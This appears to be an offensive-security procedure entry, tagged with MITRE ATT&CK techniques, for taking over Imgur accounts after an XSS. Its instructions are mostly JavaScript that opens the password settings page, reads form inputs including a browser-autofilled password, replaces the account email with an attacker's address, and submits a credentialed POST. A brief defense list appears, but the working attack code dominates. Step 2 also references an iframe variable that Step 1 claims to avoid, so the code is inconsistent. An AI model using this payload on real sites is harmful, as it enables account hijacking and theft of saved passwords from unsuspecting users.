---
id: proc-imgur-ato-form
tags:
  - account-takeover
  - credential-theft
  - form-post
  - saved-passwords
type: procedure
tools:
  - '[[tools/Firefox]]'
tactics:
  - '[[Credential Access]]'
  - '[[Impact]]'
commands:
  - '[[commands/window-open-password-settings]]'
  - '[[commands/form-data-extraction-modify]]'
  - '[[commands/fetch-password-change-post]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Credentials from Web Browsers]]'
  - '[[Steal Web Session Cookie]]'
  - '[[T1078.004]]'
updated_at: '2025-12-14T17:33:06.860Z'
skill_level: advanced
impact_level: critical
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Credential Access]]'
  - '[[Impact]]'
mitre_techniques:
  - '[[Credentials from Web Browsers]]'
  - '[[Steal Web Session Cookie]]'
  - '[[T1078.004]]'
---
# Perform-Account-Takeover-via-Form-Manipulation

## Summary

This procedure exploits executed XSS to open Imgur's password settings, extract saved form data including passwords, modify the email to the attacker's, and submit a POST request with credentials to takeover the account.

## Description

Post-XSS, JS accesses the 6th form on the settings page, reads inputs (including auto-filled password), overrides email, builds URL-encoded body, and fetches POST with include credentials. Firefox saved passwords enable theft. Expected outcome: Victim's account email changed, granting attacker control.

## Requirements

1. XSS executed in Imgur context with session
2. Victim has saved Imgur password in Firefox
3. Attacker email (e.g., keerok@protonmail.com)
4. Access to password settings endpoint

## Defense

Defensive measures and detection strategies:

- Never save passwords in browsers; use password managers
- Implement CSRF tokens and validate all form submissions
- Monitor for anomalous POSTs to settings endpoints
- Rate-limit password changes and require 2FA

## Objectives

1. Steal saved credentials from form
2. Submit modified form for email change
3. Achieve persistent account control

## Instructions

### Step 1: Open Settings Window

**Context**: Load password form in new window to avoid iframe issues.

**Command** ([[commands/window-open-password-settings]]):
```javascript
window.open("https://imgur.com/account/settings/password","_blank")
```

> Opens non-iframed page. Expected output: New window with form.

### Step 2: Extract and Modify Form

**Context**: Select form, alter email, build body.

**Command** ([[commands/form-data-extraction-modify]]):
```javascript
forms = ifr.contentDocument.getElementsByTagName("form")[5];inputs = forms.getElementsByTagName("input");body = "";for(var i =0; i < inputs.length; i++){if(inputs[i].name=="email"){inputs[i].value="keerok%40protonmail.com";}body +=inputs[i].name+"="+inputs[i].value+"&";}body += "_jafo%5BactiveExperiments%5D=%5B%5D&_jafo%5BexperimentData%5D=%7B%7D";
```

> Targets index 5 form. Expected output: body string with modified data.

### Step 3: Submit POST

**Context**: Send tampered request.

**Command** ([[commands/fetch-password-change-post]]):
```javascript
await fetch("https://imgur.com/account/settings/password", {"credentials": "include","headers": {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0","Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Accept-Language": "pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3","Content-Type": "application/x-www-form-urlencoded","Upgrade-Insecure-Requests": "1"},"referrer": "https://imgur.com/account/settings/password","body": body,"method": "POST","mode": "cors"});
```

> Includes credentials. Expected output: Successful response changing email.

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access]] Credential Access
- [[Impact]] Impact

### Techniques

- [[Credentials from Web Browsers]] Credentials from Web Browsers
- [[Steal Web Session Cookie]] Steal Web Session Cookie
- [[T1078.004]] Cloud Accounts (adapted for web ATO)

### Sub-Techniques


## Commands Used

- [[commands/window-open-password-settings]]
- [[commands/form-data-extraction-modify]]
- [[commands/fetch-password-change-post]]

## Tools Used

- [[tools/Firefox]]

## Tags

- account-takeover
- credential-theft
- form-post
- saved-passwords
